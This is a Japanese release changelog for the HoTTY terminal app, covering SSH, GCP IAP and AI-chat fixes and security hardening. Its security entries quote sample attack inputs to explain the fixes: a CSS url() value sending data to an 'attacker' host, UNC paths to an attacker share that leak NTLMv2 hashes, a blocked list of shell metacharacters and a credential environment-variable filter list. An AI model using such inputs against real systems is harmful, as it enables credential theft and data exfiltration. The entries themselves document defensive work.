- **新しいホストツリーのエクスポートが Argon2id 鍵導出を使うようになりました。** 暗号化された `.htree` エクスポートは持ち運び可能なパスワード保護ファイルであり、その鍵導出の強度がオフラインでの総当たり耐性を直接左右します。新しいエクスポートは PBKDF2-HMAC-SHA256 ではなくメモリハードな **Argon2id** (64 MiB、3 パス) で AES-256-GCM 鍵を導出するようになり、方式を将来拡張できるようフォーマットバージョンを保持します。旧バージョンで書き出された既存の `.htree` ファイルはそのまま読み込めます — 従来の PBKDF2 リーダーは後方互換性のためだけに残してあります。
- **`gcloud` の引数ガードがすべてのシェルメタ文字を拒否するようになりました。** (`cmd.exe` 経由で起動される) `gcloud.cmd` 呼び出しを保護するガードは、これまでダブルクォート文字のみを拒否していました。今後は BatBadBut の対象一式 — `"`、`%`、`^`、`&`、`|`、`<`、`>`、および改行 — を拒否し、`.cmd` バッチファイル経由の引数 / コマンドインジェクションに対する多層防御とします。この経路に到達する GCP 識別子はすべて上流で検証済みのため、既知の悪用はない経路の追加強化です。beta4 で追加し beta7 で再強化した引数クォートガードのフォローアップです。

## v2.0.3-beta7

バックエンド / フロントエンドの不具合修正に、GCP IAP 関連のセキュリティ追加対応 2 件を加えたリリースです。修正は **接続の信頼性** (実際には何も送っていなかった SSH キープアライブ、切断時に Telnet のソケットがリークしていた問題、既定以外の場所にインストールされた OpenSSH で GCP IAP の鍵生成が失敗していた問題)、**AI レイヤー** (ストリーム途中 / HTTP エラーがチャット履歴を壊していた問題、Vertex AI のエラーが `API error 0` と誤表示されていた問題、日本語初回起動時の言語セレクタの不具合)、および **クレデンシャル / 保存パスの整合性** (保存済み SSH 鍵パスフレーズ、編集したパスフレーズが再接続時に古いまま使われる問題、テキストエディタの保存順序、GCP インスタンスのアクション状態) にわたります。SSH の切断は即座に行われるようになりました。セキュリティ 2 件は、既存のクレデンシャル環境変数スクラブを IAP トンネルの `gcloud` 子プロセスにも適用し、リリースビルドでの `gcloud` 引数クォートガードを強化するものです。

### パフォーマンス

- **SSH の切断が即座に行われるようになりました。** これまで SSH セッションを切断すると、バックグラウンドのリーダータスクが固定のドレインタイムアウト (約 1.5 秒) 経過後に強制 abort されるまで待機状態のままでした — キープアライブの作り直しにより、リーダーが待っていたシグナルが取り除かれていたためです。リーダーを `tokio::select!` 経由で `CancellationToken` に接続したことで、`disconnect()` が即座にリーダーを停止し、後始末も競合のない形になりました (旧来の `Notify` ベースの経路には lost-wakeup 競合がありました)。SSH タブを閉じる / 破棄する際にこの末尾レイテンシが乗らなくなりました。

### バグ修正

- **SSH キープアライブがアイドルセッションを実際に維持するようになりました。** キープアライブタスクは内部タイマーを刻むだけで実際にはワイヤー上へ何も送っておらず、キープアライブ間隔を設定していてもアイドルな SSH セッションがサーバ側で切断されていました。HoTTY は russh ネイティブの `keepalive_interval` を使うようになり、OpenSSH の `ServerAliveInterval` と同じ仕組みである `keepalive@openssh.com` グローバルリクエストを送出します。不要になったタスクは削除しました。
- **Telnet セッションが切断時にソケットをリークしなくなりました。** Telnet の切断経路は 200 ms のタイムアウトを使い「aborting」とログ出力するものの、実際にはリーダータスクを abort しておらず、タスクが切り離されて配下のソケットがリークしていました。他プロトコルと同じく、最大 1500 ms 待ってからハンドルを `abort()` するようにしました。
- **AI プロバイダのエラーがチャット履歴を壊さなくなりました。** ストリーム途中での失敗や HTTP エラー時に、HoTTY は未回答のユーザーメッセージを残したまま部分的 / 空のアシスタントターンを追加し (さらに重複した「done」を発行し)、user / assistant の厳密な交互を要求するプロバイダ (Vertex AI、Anthropic) では会話履歴が壊れて次のメッセージが失敗していました。全プロバイダで方針を統一し、ハードエラー時は未回答のユーザーメッセージを破棄し、正常完了 / キャンセル時はアシスタントターンを保持してクリーンに閉じるようにしました。
- **Vertex AI のエラーが実際の HTTP ステータスを表示するようになりました。** Vertex AI (および Anthropic-on-Vertex 経路) は、ステータスコードを読む前にレスポンスボディを消費していたため、あらゆる失敗を `API error 0` と表示していました。先にステータスを取得するようにし、実際のコードがエラーメッセージに表示されるようにしました。
- **日本語初回起動時の AI チャット応答言語を修正しました。** 既定の応答言語値 `日本語` が `Japanese` の `<option>` に一致しなかったため、日本語環境の初回起動時にセレクタが未選択状態で表示されていました。また `Auto` を選ぶとプロンプトにリテラルの "You MUST answer in Auto." が注入されていました。共通の `languageDirective()` ヘルパーを設定エフェクトと Ask-AI フローの両方で使うようにし (English / Auto では指示を付与しない)、既定を `Japanese` とし、保存済みの `日本語` 値はマイグレーションします。
- **保存済み SSH 鍵パスフレーズが接続時に正しく使われるようになりました。** 保存済みホストへ接続する際、New Session ダイアログはユーザー名とパスワードは復号済みクレデンシャルキャッシュから解決していたものの、秘密鍵パスフレーズは解決しておらず、暗号化されたパスフレーズがそのままバックエンドに渡されて鍵認証が失敗していました。3 つのクレデンシャルをまとめて解決するようにしました。
- **ホストの鍵パスフレーズの編集が次回の再接続に反映されるようになりました。** 保存済みホストを編集した際、復号済みクレデンシャルキャッシュはユーザー名とパスワードは更新するものの秘密鍵パスフレーズは更新していなかったため、編集直後のパスフレーズが再接続時に古いまま使われることがありました。パスフレーズも他の 2 つと同様に対称的にキャッシュするようにしました。
- **テキストエディタの保存失敗時にタブの指す先がずれなくなりました。** **Save** は書き込み完了前にタブのファイルパスを確定していたため、書き込みが失敗するとタブが一度も書き込まれていないパスを指したまま残っていました。バイトが書き込まれた後にのみパスを記録するようにしました (**Save As** と同じ挙動)。
- **GCP インスタンスのアクションが互いの状態を破壊しなくなりました。** 同一インスタンスに対して start / stop アクションを重ねて発行すると、置き換えられた側の後始末が後続側の pending / live / error 状態をクリアしてしまうことがありました。トラッカーの後始末を所有権を意識したものにし、現在の所有者のみがスナップショットを確定して状態を取り下げるようにしました。
- **既定以外の場所の OpenSSH で GCP IAP の鍵生成が失敗しなくなりました。** `ssh-keygen.exe` の探索は (`ssh.exe` の探索と異なり) Windows で `PATH` スキャンをスキップしていたため、既知の場所以外にインストールされた OpenSSH では `ssh.exe` は見つかるが `ssh-keygen.exe` は見つからず、鍵生成が失敗していました。両者が同じ `PATH` 対応の実行ファイルファインダーを使うようにしました。

### セキュリティ

- **GCP IAP トンネル: `gcloud` 子プロセスがクレデンシャルを含む環境変数を継承しなくなりました。** IAP トンネルの `gcloud` ランナーは親プロセスの環境変数を未スクラブのまま全継承していましたが、もう一方の `gcloud` 経路は既にクリアした上でサニタイズ済み許可リストを適用していました。両経路で同一の方針 (`env_clear()` + `sanitized_env()`) を共有するようにし、同じクレデンシャルキャリア (API キー、トークン、`SSH_AUTH_SOCK`、セッションポインタ等) がすべての `gcloud` 呼び出しでフィルタされるようにしました。beta5 で導入したクレデンシャル環境変数スクラブを、取りこぼしていた経路にも拡張した形です。
- **GCP IAP: 引数に引用符を含む `gcloud` コマンドをすべてのビルドで拒否するようになりました。** `gcloud` 引数ベクタに `"` が現れた場合のガードは、これまで `debug_assert!` でしか発火せず、リリースビルドでは壊れたコマンドをそのまま実行していました。今後はどのビルドプロファイルでも `InvalidConfig` エラーでハードフェイルします。beta4 で追加した引数クォートガードのフォローアップです。

## v2.0.3-beta6

ホストツリー周りの使い勝手改善と、セキュリティの追加対応 2 件を中心としたリリースです。目玉の変更は、**「New Connection」で繋いだアドホックなセッションをタブから直接ホストツリーへ保存できる**ようになったことです — これまで再接続のために全項目をホストツリーフォーム側で手入力し直す必要があった手間を解消します。保存ダイアログにはホストツリーのフォルダ階層を**選択可能なツリービュー**で表示し、**+ New Folder** ボタンでダイアログを閉じることなくフォルダを (任意の深さで) 新規作成できます。ホストツリーの最上段には専用の **🆕 New Connection** 行を追加し、保存済みホストを手動で deselect しなくても新しいアドホック接続のフォームを開けるようにしました。セキュリティは beta5 で塞ぎ切れていなかった UNC 経路 2 件への追加対応です。

### 新機能

- **アドホックセッションをタブからホストツリーに保存。** SSH または Telnet セッションのタブを右クリックして **Save to Host Tree…** を選ぶと、接続を後から再利用するために保存できます。保存ダイアログには既存ホストツリーのフォルダがツリービュー表示され、最上段の **(Root)** が初期選択。任意のフォルダ行をクリックするとそのフォルダ直下が保存先になります。名前欄にはセッションの表示名がプリフィルされます。SSH の **秘密鍵パス** と **パスフレーズ** も username / password / jumpbox 構成と合わせて保存され、後から保存ホストをダブルクリックすると同じ認証構成で再接続できます。右クリックメニューは SSH / Telnet タブでのみ表示されます (Serial / WSL / Local / GCP IAP は本フローの対象外)。
- **Save to Host Tree ダイアログ内でフォルダを直接作成可能に。** フォルダツリーの下に **+ New Folder** ボタンを配置。クリック → 名前を入力 → Enter で、その時点で選択中のフォルダ直下 (または **(Root)** 選択時はツリーのルート直下) にフォルダが作られ、新フォルダがそのまま保存先として選択されます。同じ操作を繰り返せば `Production / EU / DB` のようなネスト構造をダイアログを離れずに 3 クリックで構築でき、これまでのように一旦キャンセル → ホストツリーでフォルダを作る → 保存をやり直す、という回り道が不要になりました。
- **ホストツリー最上段に 🆕 New Connection 行を追加。** 保存済みホストの上に専用行を置き、ここをクリックすると **New Session** ダイアログ右側のプロトコルフォームがリセットされ、保存済みホストを deselect することなくアドホック接続のフォームに切り替わります。クリック時にはツリー内の選択もクリアされるため、「保存ホストの編集モード」から「新規接続モード」へワンクリックで切り替わります。従来必要だった「ダイアログを開いた後にツリーの空白部分を明示クリックして deselect する」操作が不要になりました。

### 改善

- **保存したホストが再起動なしで即座にダイアログへ反映されるようになりました。** 内部的に、独立した 2 つの `useHostManager()` 呼び出し元 (Save to Host Tree ダイアログと New Session ダイアログのホストツリー) がそれぞれ `useState` で別々にツリー状態を持っていたため、保存処理は `localStorage` への書き込みと DPAPI 暗号化まで完了するものの、開いている New Session ダイアログ側はメモリ上の古いコピーを参照し続け、アプリ全体を再起動するまで新ホストが見えませんでした。フックにモジュールレベルの軽量な subscriber を追加し、ツリー更新が同期的に全ての `useHostManager()` インスタンスへ伝播するようにしたため、次に New Session ダイアログを開いた時点で (既に開いていれば即座に) 新ホストが表示されます。あわせて SSH 秘密鍵パスフレーズも password と同様に DPAPI で暗号化保存するようにしました (`privateKeyPath` はファイルパスであり秘密情報ではないため平文のまま)。

### セキュリティ

- **Vertex AI のサービスアカウントキーファイルパスとして UNC / ネットワークパスを拒否するようになりました。** レンダラーから渡された `keyFilePath` に `\\attacker\share\key.json` のような UNC を指定すると、許可セットチェックの前に `Path::canonicalize()` が呼ばれる経路があり、Windows 上では `canonicalize()` が副作用として SMB 解決を行うため、リクエストが拒否される前に NTLMv2 ハッシュが攻撃者制御の UNC へ流出する状態でした。Tauri コマンド側 `validate_service_account_key` と `VertexAIProvider` の auth-start 経路の両方で、いかなるパス解決の前に `\\…` / `//…` プレフィックスを拒否するようにしました。beta5 で SSH / Jumpbox の秘密鍵パスに入れたものと同じ防御を、Vertex AI 側の同種の経路にも適用した形です。
- **Local シェルのカスタムシェルパスとして UNC / ネットワークパスを拒否するようになりました。** **Local** プロトコルでは設定で `shell_path` によりシェル実行ファイルパスを上書き可能ですが (ホットパスではなく設定時オーバーライド)、UNC 値 (例: `\\attacker\share\evil.exe`) を指定すると `portable_pty::CommandBuilder` への spawn 時に SMB 認証が走り、バイナリ取得前に攻撃者ホストへ NTLMv2 ハッシュが流出する SSH 鍵の場合と同種の経路が成立していました。`LocalConfig::resolve_shell_path()` で `\\…` / `//…` パスを拒否し `shell_path cannot be a UNC/network path` を返すようにしました。デフォルト解決経路 (cmd.exe / PowerShell / pwsh / Git Bash のローカルインストール検出) は既知のローカルパスのみを参照するため、正規ユースケースには影響しません。

## v2.0.3-beta5

不具合修正とセキュリティハードニングを中心としたリリースです。目玉の変更は **Windows でのペースト不具合**の修正で、複数行を貼り付けると 1 行ごとに余分な空行が挟まる長年の問題を解消しました — Windows クリップボードの CRLF が改行正規化なしでリモートシェルへ送られていたことが原因です。あわせて、レンダラー / インポートされたカスタムテーマ JSON / `gcloud` ・ `wsl.exe` ・ローカルシェルの子プロセスへの環境変数継承の 3 経路で、いずれも防御的多層化 (実用上の悪用報告は無し) のセキュリティハードニングを 3 件入れています。

### バグ修正

- **ペースト時に行間に空行が入る不具合を修正しました。** Windows のシステムクリップボードは改行を CRLF (`\r\n`) で保持します。HoTTY ではペースト確認モーダルで OK を押した際にクリップボードのバイト列をそのままリモートシェルへ転送していたため、シェル側で `\r` を Enter (行を実行) として処理した後、続く `\n` をリテラルの改行としてエコーし、貼り付けた各行の下に空行が 1 行ずつ挿入される現象が発生していました。本リリースでは送信前に `\r\n` および裸の `\n` を単独の `\r` へ正規化するようにし (xterm.js 本体の `prepareTextForTerminal()` と同じ挙動)、10 行のスニペットが 19 行ではなく 10 行として貼り付けられるようになりました。`\r` 単独はそのまま温存します。HoTTY は xterm.js 組み込みのペーストハンドラを意図的に抑制してペースト確認モーダルを挟む構造になっているため、その抑制で同時に失われていた正規化ステップを復元する修正です。

### セキュリティ

- **カスタムテーマ JSON の値に対する CSS インジェクション / 外部リソース取得の経路を塞ぎました。** `save_custom_theme` Tauri コマンドは従来、テーマ変数値の長さ (≤500 文字) のみを検証していました。`%APPDATA%/com.hotty.terminal/themes/` に取り込まれた悪意あるテーマ JSON が変数値に `url("https://attacker/x?leak=…")` のような文字列を入れ、フロントエンドがその変数をスタイルルール (`background-image: var(--bg-primary)`) で使用した時点でブラウザが当該 URL を fetch してリクエストサイドチャネル経由で情報を流出させる経路が成立しうる状態でした。バックエンドは今後、テーマ値が `url(`、`;`、`{`、`}`、`<`、`>`、改行のいずれかを含む場合は拒否します。同じ検証はターミナル 4 色 (foreground / background / backgroundInactive / paneBackground) にも適用されます。なお、フロントエンド側の `setProperty('--name', value)` 経路は元々構造的に破壊された値を破棄するため、key 側の経路は最初から成立していませんでした — 本修正は value 側を閉じるものです。
- **SSH / Jumpbox の秘密鍵パスとして UNC / ネットワークパスを拒否するようになりました。** レンダラーから渡された `private_key_path` に `\\attacker\share\probe` のような UNC を指定すると、`russh::keys::load_secret_key()` がそのパスへ SMB 読み取りを発行し、Windows では NTLMv2 ハッシュが攻撃者制御のサーバへ流出して NTLM relay に転用可能な状態でした。`services::ssh::try_authenticate()` と `services::jumpbox::authenticate_jumpbox()` の両方で、`load_secret_key` 呼び出し前に `\\…` / `//…` / Win32 verbatim-UNC `\\?\UNC\…` 形式を拒否し、認証失敗トーストに `Private key path cannot be a UNC/network path` (Jumpbox の場合は `Jumpbox: …`) を表示します。UNC 上にキーを置いて運用していた場合はローカルへコピーしてください — Windows でのセキュリティ便益がエッジケースを上回ると判断しています。
- **`gcloud` / `wsl.exe` / ローカルシェルへ継承する環境変数のクレデンシャルフィルタを拡張しました。** 子プロセス (`gcloud`、`wsl.exe`、ローカルシェル) へ親プロセスの環境変数を継承する前にフィルタするパターンリストに、これまでの `API_KEY` / `SECRET` / `TOKEN` / `PASSWORD` / `PASSWD` / `CREDENTIAL` / `PRIVATE_KEY` / `ACCESS_KEY` に加えて、`AUTH` (これにより `SSH_AUTH_SOCK` が確実にフィルタされます — `wsl.exe` に継承されるとホスト側 SSH エージェントへの WSL からのアクセスを許してしまうため重要) 、`SESSION` (1Password の `OP_SESSION_*` などのセッションポインタ) 、`PASSPHRASE`、明示的な変数名として `AWS_PROFILE` と `KUBECONFIG` (これらはディスク上のクレデンシャルファイルへのポインタ) を追加しました。`gcloud_iap.rs` / `local.rs` / `wsl.rs` の 3 ファイルにあった同一のフィルタ実装は共通ヘルパーに統合され、今後の追加は 1 か所だけ行えば 3 経路すべてに反映されます。

## v2.0.3-beta4

仕上げと不具合修正にフォーカスしたリリースです。目玉の変更は **SSH / Telnet / Jumpbox の接続失敗メッセージ** で、ライブラリ生エラー (`connection failed: example.com:22: failed to lookup address information: ...`) を短く分かりやすい英語ラベル (`Host not found`、`Wrong passphrase for private key`、`Jumpbox: Connection refused`、…) に置き換えました。**GCP Instances ペイン** には IAP トンネル権限を持たない VM を非表示にする IAM 連動フィルタを追加しています。あわせて、beta2 / beta3 で一部ユーザーが遭遇していた OS Login メタデータプローブの回帰 (`gcloud` projection に埋め込まれた `"` が `cmd.exe` のクォート処理を破壊し、`'C:\…\Google\Cloud' is not recognized` で失敗) を修正し、同じプローブが組織レベル OS Login の強制も正しく扱うようになりました。

### 新機能

- **GCP Instances ペイン: IAM 連動フィルタを追加。** リフレッシュ時に HoTTY が `gcloud projects test-iam-permissions` / `gcloud compute instances test-iam-permissions` 経由で `iap.tunnelInstances.accessViaIAP` と `compute.instances.osLogin` をプロジェクトレベル (プロジェクト IAP が拒否された場合はインスタンスレベルでも) プローブします。IAP トンネル権限を持たない VM はデフォルトで非表示にし、ペインヘッダの **🔒 カウンターボタン**で再表示をトグルできます。OS Login 権限を持たないインスタンスは引き続き表示されますが (メタデータ SSH 鍵経由なら SSH できる可能性があるため)、**🔑 警告アイコン**が付きます。IAM プローブそのものが失敗した場合 (ネットワーク瞬断、プロジェクト削除など) はインスタンスを表示したままにし、アクセス可能な VM を誤って隠さないようにしています。「非表示インスタンスを表示」のトグル状態は `localStorage` で起動間で保持されます。

### 改善

- **SSH / Telnet / Jumpbox の接続エラーを平易な英語表記に変更。** 接続失敗トーストの本文を `russh` / `std::io::Error` の生文字列ではなく、短く分かりやすいラベルに書き換えました。例:

  | 旧 | 新 |
  | --- | --- |
  | `connection failed: example.com:22: failed to lookup address information: ...` | `Host not found` |
  | `connection failed: example.com:22: Connection refused (os error 10061)` | `Connection refused` |
  | `connection failed: example.com:22: timed out after 15s` | `Connection timed out (15s)` |
  | `connection failed: no common kex algorithms` | `No common kex algorithm with server` |
  | `authentication failed: all authentication methods failed` | `Authentication failed` |
  | `authentication failed: password: Disconnect ServiceNotAvailable` | `Password authentication failed` |
  | `authentication failed: load key failed: ... bad decrypt ...` | `Wrong passphrase for private key` |
  | `connection failed: ssh-over-jumpbox: timed out after 15s` | `Target connection timed out via jumpbox (15s)` |

  踏み台側で接続が落ちた場合は `Jumpbox: …` プレフィックスが付くため、どちらのホップで失敗したかが一目で分かります。元の生エラーは引き続きデバッグログファイルに記録されるため、原因解析には影響しません — 変わるのはトースト表示のみです。
- **gcloud の OS Login 判定が組織レベルの強制を考慮するようになりました。** 従来はインスタンスとプロジェクトのメタデータがいずれも `enable-oslogin=TRUE` でない場合、ローカルの Windows ユーザー名にそのままフォールバックしていました。これは `constraints/compute.requireOsLogin` ポリシーで組織レベルに OS Login を強制している GCP テナント (エンタープライズでは一般的) では問題で、メタデータ側に `enable-oslogin` フラグが書かれないため IAP 接続が成立しなくなる原因でした。本リリースではこのケースでもアクティブな gcloud アカウントの POSIX プロファイルをプローブし、存在する場合はその OS Login ユーザー名を採用するようになりました — `gcloud compute ssh` 本体の解決順序と一致します。POSIX プロファイルが存在しない場合のみ、従来通りローカルユーザー名にフォールバックします。
- **「Compute Engine API not enabled」メッセージをさらに短縮**しました (beta3 のフォローアップ)。**GCP Instances** ペインで Compute Engine API が無効なプロジェクト行下に表示されていたエラーを `Compute Engine API is not enabled.` の 1 文だけに整理しました。以前ペインに表示していた対処コマンド `gcloud services enable compute.googleapis.com --project=…` は本文から外し、対応コマンドを含む gcloud stderr の全文は引き続きデバッグログに残します (コピー/ペーストして使いたい場合はそちらをご確認ください)。

### バグ修正

- **gcloud の OS Login プローブが `'C:\…\Google\Cloud' is not recognized` で失敗する不具合を修正。** beta2 で追加した OS Login 判定の metadata describe 呼び出しは `--format=value("...filter("key:enable-oslogin")...")` を指定しており、引数列に `"` を埋め込んでいました。Windows では `gcloud` が `gcloud.cmd` として配布されており、Rust 標準ライブラリは `.cmd` ファイルを `cmd.exe` 経由で起動します。`cmd.exe` の「コマンドライン全体に `"` が 3 個以上あった場合、外側のペアを 1 組削る」ルールがプログラムパスのクォートを剥がしてしまい、gcloud が起動する前にパス解決で失敗していました。本リリースでは `--format=json(metadata.items)` (引数に `"` を含まない形式) に変更し、出力を `serde_json` でパースするようにしました。あわせて `run_gcloud_capture` 内に `"` を含む引数を弾く debug-assert を追加して、今後同じ回帰が再発しないように保護しています。

## v2.0.3-beta3

UI 仕上げを目的とした小規模リリースです。目玉の変更は **New Session** ダイアログの整理で、**Hosts** タブと **GCP** タブの横幅が揃い、Hosts タブの中にホストツリーとプロトコル設定フォームの両方が明確に内包されるようになりました。あわせて、Compute Engine API が無効なプロジェクトを GCP Discovery でリフレッシュした際に表示されていた冗長なエラーメッセージを短縮しています。

### 改善

- **New Session ダイアログ: Hosts / GCP タブのレイアウトを揃えました。** 従来 **Hosts** タブは 380 px に縮こまる一方で **GCP** タブはモーダル幅いっぱいに広がっており、同じウィジェットなのに別物のように見えていました。タブバーが両タブ共通でモーダル幅いっぱいに広がるようにし、**Hosts** タブではホストツリー / リサイズ用ディバイダ / プロトコル設定フォームがすべてタブ本体の中に配置されるよう作り直しました。タブボタン自体もタブ帯の左上に並ぶ自然幅のピル形状に変更しています (旧: 50/50 で 2 ペインを分けるレイアウト)。これにより、**Hosts** タブの右側にあるプロトコル設定フォームが **GCP** タブの中身のように見えてしまう問題も解消しました。
- **GCP Discovery: "Compute Engine API not enabled" メッセージを短縮しました。** **GCP Instances** ペインで Compute Engine API が無効なプロジェクト (`Default Gemini Project` や Vertex / AI Studio 管理のプロジェクトでよく見るケース) をリフレッシュした際に各プロジェクト行下に表示されていたエラーメッセージを、重複していたプロジェクト名と「Cloud Console から有効化する」代替案を削って 2 文 → 1 文に縮めました。残された文には引き続き対処コマンド `gcloud services enable compute.googleapis.com --project=…` とプロジェクト ID が含まれており、ペイン上のノイズだけが減っています。

## v2.0.3-beta2

Google Cloud IAP の UX 全面刷新リリースです。IAP はもうホストごとのフォーム項目ではなく、New Session ダイアログに専用の **GCP** タブが追加され、アクセス可能なすべてのプロジェクト配下の GCE インスタンスをライブステータス・起動 / 停止操作・ワンクリック接続つきで一覧できます。接続経路もあわせて改善し、対象 VM が停止中の場合は IAP トンネル開始前にユーザーへ確認するか、設定に応じて自動起動するようになりました。

### 破壊的変更

- **Google Cloud IAP がプロトコルドロップダウンから削除されました。** **New Session** ダイアログとホストツリーの追加 / 編集モーダルの両方から `Google Cloud IAP` のプロトコル項目を削除しました。保存済みのホストツリー上の既存 IAP エントリはダブルクリックでこれまで通り接続できます (IAP プロトコル本体・`iapTunnel` スキーマ・`gcloud-iap` 接続経路はディスク上もバックエンド側も変更なし) が、ホストツリーのフォームから新規作成・編集することはできなくなりました。新規 IAP 接続を行いたい場合は New Session ダイアログの **GCP** タブを開いて目的の VM をダブルクリックしてください。

### 新機能

- **New Session ダイアログに GCP インスタンス専用タブを追加。** **Hosts** タブの隣に新設したタブで、アクセス可能なすべての Google Compute Engine VM をプロジェクト単位にグルーピングして一覧できます。各行にはライブステータスのアイコン (🟢 RUNNING / 🔴 停止 / 🟡 遷移中) と最終リフレッシュ時刻を表示します。インスタンスをシングルクリックで選択、**ダブルクリックで即時 IAP 接続**します。各行には専用の **Start** / **Stop** ボタンを備え、`gcloud compute instances start` / `stop` を発行した上で「starting…」「stopping…」を楽観表示しつつ `describe` をポーリングして実際の遷移 (PROVISIONING / STAGING / STOPPING) を反映するため、行の表示が GCP 側の状態と乖離しません。ペイン上部の **Refresh** で gcloud チェック → 認証チェック → `projects list` → 各プロジェクトの `instances list --filter='zone:*'` を全工程実行します。長時間のリフレッシュで止まって見えないよう、進捗 (`gcloud → auth → projects → instances → done`) はストリームで表示されます。
- **接続前 VM 自動起動プロンプト。** IAP 接続を開始した時点で対象 VM が `TERMINATED` または `SUSPENDED` 状態だった場合、HoTTY はトンネル開始前に介入し、ホストエントリの `autoStart` が有効なら自動起動を、無効ならモーダルでユーザーに起動可否を確認します。バックエンドはセッション単位の oneshot でユーザーの応答を待ち、VM が `RUNNING` に到達してから IAP トンネル接続を続行します。従来は停止中 VM に対してそのまま `gcloud start-iap-tunnel` に投げて短いハング後にトンネルエラーで失敗していました。新しい GCP タブからのワンショット接続は既定で自動起動扱いになります — ユーザーが明示的にその VM をダブルクリックして接続を要求しているため、再度の確認は冗長と判断しています。

## v2.0.3-beta1

診断機能の強化を目的とするプレリリースです。目玉の変更は Google Cloud IAP の接続経路をフェーズ単位で計装したことで、実環境で IAP 接続が失敗した際に「不透明な接続失敗エラー」ではなく、各フェーズの境界 — gcloud と ssh.exe のパス解決、OS Login 判定結果、サブプロセスの完全な argv と PID、gcloud stdout/stderr の各行、TCP プローブの試行、各フェーズの経過時間 — がデバッグログに残るようになりました。

### 改善

- **Google Cloud IAP 接続に詳細なフェーズ別診断ログを追加しました。** Google Cloud IAP 経由の接続が、各ステップで info レベルのログをデバッグログファイル (**Open Debug Log Folder** から開くフォルダ) に書き出すようになりました。記録される内容は、解決された `gcloud` プログラムと `ssh.exe` のパス、関連する環境変数 (`PATH`、`APPDATA`、`USERPROFILE`、`CLOUDSDK_CONFIG` など) の有無、OS Login 判定結果と解決されたユーザー名、`gcloud start-iap-tunnel` と `ssh.exe` の完全な argv、両サブプロセスの PID、`gcloud` stdout/stderr の各行 (従来は debug レベルでリリースビルドでは無音でフィルタされていた行)、選ばれたローカルポートへの TCP プローブ試行、トンネル ready 待ち中のハートビート、`gcloud` が ready 前に終了した場合や readiness がタイムアウトした場合の `combined_log` の全文、そして各フェーズの経過時間です。IAP 接続が失敗した際は、このログファイルを添付して報告するだけで認証 / ネットワーク / OS Login / SSH 鍵などの原因切り分けに必要な情報が揃うようになります。

## v2.0.2

メンテナンスリリースです。目玉の変更は Google Cloud IAP トンネルの readiness 検出修正で、新規 IAP 接続が成功するまで何度かリトライを繰り返していた問題が解消されます。あわせて 2 件のセキュリティハードニング — どちらも他所で使われているダイアログ承認パターンをレンダラー側から迂回できる経路を塞ぐもので、実用上の悪用報告はありません — と、テーマ変数と UI 一貫性の小さな修正が入っています。

### 改善

- **隠し AI タブのグラデーションをエンドツーエンドでテーマ化可能に。** `--color-danger` の暗い派生色である `--color-danger-shade` 変数を追加し、隠し AI チャットタブのグラデーション両端で使うようにしました。従来は両端がハードコードされた `black` と混色されていたため、ダークテーマでは正しく見える一方ライトテーマで反転できませんでした。カスタムテーマでは他の danger 系カラーと同様に **Settings &rarr; Appearance &rarr; Create Custom Theme &rarr; Status & Signals** から上書きできます。
- **Text Editor ペインのボタン整合性。** Text Editor のメニューボタンと検索バーボタンが、Log Viewer / Ping Monitor のツールバーボタンと同じ `:hover:not(:disabled)` パターンに揃えられ、検索バーボタンは余計な border を外して同じペインのメニューボタンと見た目が一致するようになりました。

### バグ修正

- **gcloud IAP トンネルの readiness 検出が Python の stderr バッファリングで誤判定しなくなりました。** Google Cloud IAP 経由の接続で readiness 検出が静かに失敗していた原因は、`gcloud` の `tunnel-through-iap` サブプロセスの stderr がパイプ越しではブロックバッファされ「Listening on port N」の行が即時に HoTTY 側へ届かず、その間に接続がリトライされていたことでした。検出ロジックを「割り当てたローカルポートへの TCP プローブ」に切り替え、stderr テキストのパースに依存しないようにし、冗長な接続前プローブも撤去しました。

### セキュリティ

- **テキストエディタのファイルドロップが明示的なユーザー承認を要求するようになりました。** Text Editor にドラッグされたファイルパスをレンダラーから承認するように要求された際、バックエンドは承認セットへ追加する前に OS ネイティブの確認ダイアログを表示するようになりました。従来のフローはシンボリックリンク判定 / センシティブパス判定 / 50 MB 上限を満たす任意のパスをそのまま受け入れていました — これは `text_editor_open_file` / `text_editor_save_file` で使われているダイアログ承認パターンをレンダラー側から迂回できる経路になっていました。承認はセッション内でキャッシュされるため同じファイルの再オープンでは再プロンプトしませんが、アプリ再起動後は再度確認します。Tauri レベルのドラッグ&ドロップイベントは引き続き無効化されているため、レンダラー側からのリクエストなしにこの確認ダイアログが出ることはありません。
- **Ping Monitor の CSV ロギングがユーザー承認済みのログディレクトリを要求するようになりました。** Ping Monitor で CSV ロギングを有効化した際、バックエンドは書き出し前に `LogManager::is_dir_approved` を確認するようになりました (セッションログ側で既に行われているガードと同じ仕組み)。**Browse...** ピッカーまたはネイティブ確認ダイアログで該当ディレクトリが承認されていない場合、モニタリング自体は継続しますが CSV は作成されず、レンダラーへ偽のログファイルパスを通知することもありません。Ping Monitor ペインの **Browse...** ボタンでディレクトリを一度承認しておけば、既存のセッションログ承認と同じ場所に永続化されます。

## v2.0.1

v2.0.0 へのフォローアップリリースです。目玉の変更は **Google Cloud IAP** をトップレベルのプロトコルに昇格させたことで、IAP 接続に SSH 認証情報が一切不要になりました。残りはセキュリティが中心で、ファイルシステム周辺のレンダラー側列挙ギャップを 1 件塞ぎ、Windows でこれまで静かに既存の機微パスチェックを無効化していたマッチャーのバグを 1 件修正しました。あわせて v2.0.0 で取りこぼしていた小さな UI フォント統一も入っています。

### 新機能

- **Google Cloud IAP がトップレベルのプロトコルになりました。** 従来は SSH フォーム内の "Connect via Google Cloud IAP" チェックボックスでしたが、Protocol ドロップダウンに独立した項目として並ぶようになりました (新規セッションダイアログとホストツリーの追加/編集モーダルの両方)。これを選ぶとユーザー名 / パスワード / 秘密鍵フィールドは消え、HoTTY は接続を <code>gcloud compute ssh --tunnel-through-iap</code> に委譲します。IAP トンネルの確立、OS Login のマッピング、SSH キーの自動生成 (<code>~/.ssh/google_compute_engine</code>)、プロジェクトへのキー登録、認証はすべて gcloud 側で処理されます。Google Cloud SDK をインストールし `gcloud auth login` を一度完了させておくだけで使えます。ホストツリー上では `<project>:<instance> (IAP)` のように表示されるので一目で識別できます。

### 改善

